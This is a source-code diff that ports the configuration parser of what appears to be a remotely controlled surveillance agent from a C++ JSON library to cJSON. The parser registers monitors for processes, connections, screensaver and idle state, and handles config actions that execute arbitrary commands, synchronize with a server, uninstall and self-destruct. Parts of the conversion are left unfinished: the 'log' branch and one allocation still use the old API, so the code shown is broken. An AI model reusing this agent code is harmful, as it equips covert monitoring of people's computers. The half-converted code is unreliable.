@@ -35,12 +35,12 @@ ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action);
 typedef void (WINAPI *conf_callback_t)(cJSON *, DWORD counter);
 extern BOOL HM_ParseConfSection(char *conf, CHAR *section, conf_callback_t call_back);
 extern BOOL HM_CountConfSection(char *conf, CHAR *section, DWORD *count);
-extern DWORD AM_GetAgentTag(const WCHAR *agent_name);
+extern DWORD AM_GetAgentTag(const CHAR *agent_name);
 
 // Gestione event monitor  ----------------------------------------------
 
 typedef struct  {
-	WCHAR event_type[32];
+	CHAR event_type[32];
 	EventMonitorAdd_t pEventMonitorAdd;
 	EventMonitorStart_t pEventMonitorStart;
 	EventMonitorStop_t pEventMonitorStop;
@@ -117,14 +117,14 @@ void StopRepeatThread(DWORD event_id)
 }
 
 // Registra un nuovo event monitor
-void EventMonitorRegister(WCHAR *event_type, EventMonitorAdd_t pEventMonitorAdd, 
+void EventMonitorRegister(CHAR *event_type, EventMonitorAdd_t pEventMonitorAdd, 
 						  EventMonitorStart_t pEventMonitorStart,
 						  EventMonitorStop_t pEventMonitorStop)
 {
 	if (event_monitor_count >= MAX_EVENT_MONITOR)
 		return;
 
-	swprintf_s(event_monitor_array[event_monitor_count].event_type, L"%s", event_type);
+	sprintf_s(event_monitor_array[event_monitor_count].event_type, "%s", event_type);
 	event_monitor_array[event_monitor_count].pEventMonitorAdd = pEventMonitorAdd;
 	event_monitor_array[event_monitor_count].pEventMonitorStop = pEventMonitorStop;
 	event_monitor_array[event_monitor_count].pEventMonitorStart = pEventMonitorStart;
@@ -173,14 +173,14 @@ void SM_EventTableState(DWORD event_id, BOOL state)
 }
 
 // Assegna una riga "evento" della configurazione al corretto event monitor
-void EventMonitorAddLine(const WCHAR *event_type, cJSON* conf_json, EVENT_PARAM *event_param, DWORD event_id, BOOL event_state)
+void EventMonitorAddLine(const CHAR *event_type, cJSON* conf_json, EVENT_PARAM *event_param, DWORD event_id, BOOL event_state)
 {
 	DWORD i;
 	// Inizializza lo stato attivo/disattivo dell'evento
 	SM_EventTableState(event_id, event_state);
 
 	for (i=0; i<event_monitor_count; i++)
-		if (!wcsicmp(event_monitor_array[i].event_type, event_type)) {
+		if (!stricmp(event_monitor_array[i].event_type, event_type)) {
 			event_monitor_array[i].pEventMonitorAdd(conf_json, event_param, event_id);
 			break;
 		}
@@ -440,51 +440,53 @@ void WINAPI ParseEvents(cJSON *conf_json, DWORD counter)
 {
 	EVENT_PARAM event_param;
 
-	if (conf_json[L"start"])
-		event_param.start_action = conf_json[L"start"]->AsNumber();
+	if (cJSON_GetObjectItem(conf_json, "start"))
+		event_param.start_action = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "start"));
 	else
 		event_param.start_action = AF_NONE;
 
-	if (conf_json[L"end"])
-		event_param.stop_action = conf_json[L"end"]->AsNumber();
+	if (cJSON_GetObjectItem(conf_json, "end"))
+		event_param.stop_action = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "end"));
 	else
 		event_param.stop_action = AF_NONE;
 
-	if (conf_json[L"repeat"])
-		event_param.repeat_action = conf_json[L"repeat"]->AsNumber();
+	if (cJSON_GetObjectItem(conf_json, "repeat"))
+		event_param.repeat_action = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "repeat"));
 	else
 		event_param.repeat_action = AF_NONE;
 
-	if (conf_json[L"iter"])
-		event_param.count = conf_json[L"iter"]->AsNumber();
+	if (cJSON_GetObjectItem(conf_json, "iter"))
+		event_param.count = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "iter"));
 	else
 		event_param.count = 0xFFFFFFFF;
 
-	if (conf_json[L"delay"]) {
-		event_param.delay = (conf_json[L"delay"]->AsNumber() * 1000);
+	if (cJSON_GetObjectItem(conf_json, "delay")) {
+		event_param.delay = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "delay")) * 1000;
 		if (event_param.delay == 0)
 			event_param.delay = 1;
 	} else
 		event_param.delay = 1;
 
-	EventMonitorAddLine(conf_json[L"event"]->AsString().c_str(), conf_json, &event_param, counter, conf_json[L"enabled"]->AsBool());
+	EventMonitorAddLine(
+		cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "event")), 
+		conf_json, &event_param, counter, cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "enabled")));
 }
 
-BYTE *ParseActionParameter(JSONObject conf_json, DWORD *tag)
+BYTE *ParseActionParameter(cJSON* conf_json, DWORD *tag)
 {
-	WCHAR action[64];
+	char action[64];
 	BYTE *param = NULL;
 	
 	if (tag)
 		*tag = AF_NONE;
 
-	_snwprintf_s(action, 64, _TRUNCATE, L"%s", conf_json[L"action"]->AsString().c_str());		
+	_snprintf(action, 64, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "action")));		
 
-	if (!wcscmp(action, L"log")) {
+	if (!strcmp(action, "log")) {
 		*tag = AF_LOGINFO;
 		param = (BYTE *)wcsdup(conf_json[L"text"]->AsString().c_str());
 
-	} else if (!wcscmp(action, L"synchronize")) {
+	} else if (!strcmp(action, "synchronize")) {
 		typedef struct {
 			DWORD min_sleep;
 			DWORD max_sleep;
@@ -497,76 +499,76 @@ BYTE *ParseActionParameter(JSONObject conf_json, DWORD *tag)
 		param = (BYTE *)malloc(sizeof(sync_conf_struct) + wcslen(conf_json[L"host"]->AsString().c_str())*2);
 		if (param) {
 			sync_conf = (sync_conf_struct *)param;
-			sync_conf->min_sleep = conf_json[L"mindelay"]->AsNumber();
-			sync_conf->max_sleep = conf_json[L"maxdelay"]->AsNumber();
-			sync_conf->band_limit= conf_json[L"bandwidth"]->AsNumber();
-			sync_conf->exit_after_completion = conf_json[L"stop"]->AsBool();
-			sprintf(sync_conf->asp_server, "%S", conf_json[L"host"]->AsString().c_str());
+			sync_conf->min_sleep = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "mindelay"));
+			sync_conf->max_sleep = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "maxdelay"));
+			sync_conf->band_limit= cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "bandwidth"));
+			sync_conf->exit_after_completion = cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "stop"));
+			sprintf(sync_conf->asp_server, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "host")));
 		}
 
-	} else if (!wcscmp(action, L"execute")) {
+	} else if (!strcmp(action, "execute")) {
 		*tag = AF_EXECUTE;
-		DWORD len = wcslen(conf_json[L"command"]->AsString().c_str());
+		DWORD len = strlen(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "command")));
 		param = (BYTE *)malloc(len+1);
-		sprintf((char *)param, "%S", conf_json[L"command"]->AsString().c_str());
-	} else if (!wcscmp(action, L"uninstall")) {
+		sprintf((char *)param, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "command")));
+	} else if (!strcmp(action, "uninstall")) {
 		*tag = AF_UNINSTALL;
 
-	} else if (!wcscmp(action, L"module")) {
-		if (!wcscmp(conf_json[L"status"]->AsString().c_str(), L"start"))
+	} else if (!strcmp(action, "module")) {
+		if (!strcmp(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "status")), "start"))
 			*tag = AF_STARTAGENT;
 		else
 			*tag = AF_STOPAGENT;
 		param = (BYTE *)malloc(sizeof(DWORD));
 		if (param) {
-			DWORD agent_tag = AM_GetAgentTag(conf_json[L"module"]->AsString().c_str());
+			DWORD agent_tag = AM_GetAgentTag(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "module")));
 			memcpy(param, &agent_tag, sizeof(DWORD));
 		}
 
-	} else if (!wcscmp(action, L"event")) {
-		if (!wcscmp(conf_json[L"status"]->AsString().c_str(), L"enable"))
+	} else if (!strcmp(action, "event")) {
+		if (!strcmp(cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "status")), "enable"))
 			*tag = AF_STARTEVENT;
 		else
 			*tag = AF_STOPEVENT;
 		param = (BYTE *)malloc(sizeof(DWORD));
 		if (param) {
-			DWORD event_id = conf_json[L"event"]->AsNumber();
+			DWORD event_id = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "event"));
 			memcpy(param, &event_id, sizeof(DWORD));
 		}
-	} else if (!wcscmp(action, L"destroy")) {
+	} else if (!strcmp(action, "destroy")) {
 		*tag = AF_DESTROY;
 		param = (BYTE *)malloc(sizeof(BOOL));
 		if (param) {
-			BOOL isPermanent = conf_json[L"permanent"]->AsBool();
+			BOOL isPermanent = cJSON_IsTrue(cJSON_GetObjectItem(conf_json, "permanent"));
 			memcpy(param, &isPermanent, sizeof(BOOL));
 		}
 	}
 	return param;
 }
 
-void WINAPI ParseActions(JSONObject conf_json, DWORD counter)
+void WINAPI ParseActions(cJSON* conf_json, DWORD counter)
 {
-	JSONArray subaction_array;
+	cJSON* subaction_array = cJSON_GetObjectItem(conf_json, "subactions");
 	DWORD i;
 	DWORD tag;
 	BYTE *conf_ptr;
 
-	if (!conf_json[L"subactions"])
-		return;
-	subaction_array = conf_json[L"subactions"]->AsArray();
+	if (cJSON_IsArray(subaction_array)) {
+		cJSON* subaction = NULL;
+		i = 0;
 
-	for (i=0; i<subaction_array.size(); i++) {
-		JSONObject subaction;
-		if (!subaction_array[i]->IsObject())
-			continue;
-		subaction = subaction_array[i]->AsObject();
-		conf_ptr = ParseActionParameter(subaction, &tag);
-		// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
-		// Basta una subaction slow per marcare tutto l'action
-		if (ActionTableAddSubAction(counter, tag, conf_ptr)) {
-			EVENT_ACTION_ELEM* entry = GetEventPosition(counter);
-			if (entry != NULL)
-				entry->is_fast_action = FALSE;
+		cJSON_ArrayForEach(subaction, subaction_array) {
+			if (cJSON_IsObject(subaction) == false)
+				continue;
+
+			conf_ptr = ParseActionParameter(subaction, &tag);
+			// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
+			// Basta una subaction slow per marcare tutto l'action
+			if (ActionTableAddSubAction(counter, tag, conf_ptr)) {
+				EVENT_ACTION_ELEM* entry = GetEventPosition(counter);
+				if (entry != NULL)
+					entry->is_fast_action = FALSE;
+			}
 		}
 	}
 }
@@ -673,16 +675,16 @@ void SM_MonitorEvents(DWORD dummy)
 	DWORD dummy2;
 
 	// Registrazione degli EM e delle AF. 
-	EventMonitorRegister(L"timer", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
-	EventMonitorRegister(L"afterinst", EM_TimerAdd, NULL, NULL);
-	EventMonitorRegister(L"date", EM_TimerAdd, NULL, NULL);
-	EventMonitorRegister(L"process", EM_MonProcAdd, EM_MonProcStart, EM_MonProcStop);
-	EventMonitorRegister(L"connection", EM_MonConnAdd, EM_MonConnStart, EM_MonConnStop);
-	EventMonitorRegister(L"screensaver", EM_ScreenSaverAdd, EM_ScreenSaverStart, EM_ScreenSaverStop);	
-	EventMonitorRegister(L"winevent", EM_MonEventAdd, EM_MonEventStart, EM_MonEventStop);	
-	EventMonitorRegister(L"quota", EM_QuotaAdd, EM_QuotaStart, EM_QuotaStop);	
-	EventMonitorRegister(L"window", EM_NewWindowAdd, EM_NewWindowStart, EM_NewWindowStop);
-	EventMonitorRegister(L"idle", EM_UserIdlesAdd, EM_UserIdlesStart, EM_UserIdlesStop);
+	EventMonitorRegister("timer", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
+	EventMonitorRegister("afterinst", EM_TimerAdd, NULL, NULL);
+	EventMonitorRegister("date", EM_TimerAdd, NULL, NULL);
+	EventMonitorRegister("process", EM_MonProcAdd, EM_MonProcStart, EM_MonProcStop);
+	EventMonitorRegister("connection", EM_MonConnAdd, EM_MonConnStart, EM_MonConnStop);
+	EventMonitorRegister("screensaver", EM_ScreenSaverAdd, EM_ScreenSaverStart, EM_ScreenSaverStop);	
+	EventMonitorRegister("winevent", EM_MonEventAdd, EM_MonEventStart, EM_MonEventStop);	
+	EventMonitorRegister("quota", EM_QuotaAdd, EM_QuotaStart, EM_QuotaStop);	
+	EventMonitorRegister("window", EM_NewWindowAdd, EM_NewWindowStart, EM_NewWindowStop);
+	EventMonitorRegister("idle", EM_UserIdlesAdd, EM_UserIdlesStart, EM_UserIdlesStop);
 
 	ActionFuncRegister(AF_SYNCRONIZE, DA_Syncronize, FALSE);
 	ActionFuncRegister(AF_STARTAGENT, DA_StartAgent, TRUE);
